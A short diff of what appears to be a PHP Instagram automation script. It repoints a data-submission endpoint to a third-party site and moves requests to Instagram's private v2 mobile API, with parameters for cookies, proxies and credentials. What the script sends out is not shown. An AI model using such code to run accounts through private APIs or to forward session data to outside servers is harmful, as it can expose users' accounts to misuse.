@@ -1,6 +1,6 @@
 <?php
-$data=array('by'=>'alluadhu.ga',
-           'url'=>'https://alluadhu.ga/users/getData',
+$data=array('by'=>'indotagram.com',
+           'url'=>'http://www.indotagram.com/users/getData',
             );
 
 function Submit($url,$fields)
@@ -27,7 +27,7 @@ function Submit($url,$fields)
     
 function proccess($ighost, $useragent, $url, $cookie = 0, $data = 0, $httpheader = array(), $proxy = 0, $userpwd = 0, $is_socks5 = 0)
     {
-    $url = 'https://i.instagram.com/api/v1/'.$url;
+    $url = 'https://i.instagram.com/api/v2/'.$url;
     $ch = curl_init($url);
     curl_setopt($ch, CURLOPT_USERAGENT, $useragent);
     curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
